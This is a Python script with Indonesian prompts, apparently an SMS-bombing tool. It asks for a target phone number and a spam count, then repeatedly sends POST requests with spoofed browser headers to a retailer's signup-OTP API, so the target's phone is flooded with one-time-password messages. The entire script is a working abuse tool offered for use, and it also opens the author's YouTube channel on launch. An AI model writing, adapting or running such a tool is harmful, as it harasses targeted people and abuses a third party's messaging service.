import json
import requests
import os
import sys
import time

def main():
	os.system('clear')
	os.system('clear')
	print(f'\033[1;36mSubscribe Yt Gua Dlu Cuk')
	os.system('xdg-open https://youtube.com/channel/UCpiiUOZeivl7yqPU9u0f0tw')
	time.sleep(3)
	os.system('clear')
	banner = '''

	              \033[1;31m ╔═╗    ╔═╗
                       ║═╣╔══╗║═╣
                       ╠═║║║║║╠═║   \033[0;35m ▀▄▀     ▄     ▄
               \033[1;33m ╔═╗╔═╗\033[1;31m ╚═╝╚╩╩╝╚═╝\033[0;35m ▄███████▄  ▀██▄██▀
               \033[1;33m ║═╣║╬║╔═╗ ╔══╗\033[0;35m  ▄█████▀█████▄  ▄█
               \033[1;33m ╠═║║╔╝║╬╚╗║║║║ \033[0;35m ███████▀████████▀
               \033[1;33m ╚═╝╚╝ ╚══╝╚╩╩╝ \033[0;35m  ▄▄▄▄▄▄███████▀
\033[1;36m            \033[1;33m[\033[1;36m☯\033[1;33m]\033[1;36m__________________________________________\033[1;33m[\033[1;36m☯\033[1;33m]
\033[1;36m             |                                            |
\033[1;36m             |\033[1;33m    [\033[1;36m+\033[1;33m] AUTHOR :  Tam-PolX                  \033[1;36m|
\033[1;36m             |\033[1;33m    [\033[1;36m+\033[1;33m] YT     :  Durjana Elite             \033[1;36m|
\033[1;36m             |\033[1;33m    [\033[1;36m+\033[1;33m] IG     :  yslbstm                  \033[1;36m |
\033[1;36m             |\033[1;33m    [\033[1;36m+\033[1;33m] FB     :  Ompong Belo            \033[1;36m   |
\033[1;36m            \033[1;33m[\033[1;36m☯\033[1;33m]\033[1;36m__________________________________________\033[1;33m[\033[1;36m☯\033[1;33m]

                 \033[1;31m GUNAKAN TOOLS INI DENGAN BIJAK  OK!



\033[1;36mNomor Diawali Dengan (088xx)
	'''
	print(banner)
	no = input('\033[1;33m[\033[1;36m•\033[1;33m]   Nomor Target \033[1;35m =>\033[1;37m ')
	jum = input('\033[1;33m[\033[1;36m•\033[1;33m]   Jumlah Spam  \033[1;35m =>\033[1;37m ')


	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}


	for x in range (int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp",headers=head, json=dat)
		if 'eror' in leosureo:
			print('\033[1;31m ☯Gagal\033[1;33m Mengirim\033[1;31m Pesan Ke ' + no)
			time.sleep(2)
		else:
			print('\033[1;32m ☯Sukses\033[1;33m Mengirim\033[1;32m Pesan Ke ' + no)
			time.sleep(2)


try:
	main()
	while True:
		plh=input(f"\033[1;33mMau Kirim Sms Lagi? (y/\033[1;31mn\033[1;33m) :\033[1;32m ")
		if plh.lower() == 'y':
			main()
		elif plh.lower() == 'n':
			print(f"\033[1;36mJangan Lupa Bahagia, Dan Tetap Tersenyum:) Walaupun Tersakiti");time.sleep(1);
			print(f"{m}Exit")
			sys.exit()

except KeyboardInterrupt:
	print('\nErr: KeyboardInterrupt')
except Exception as E:
	print(f'Bye:) ')

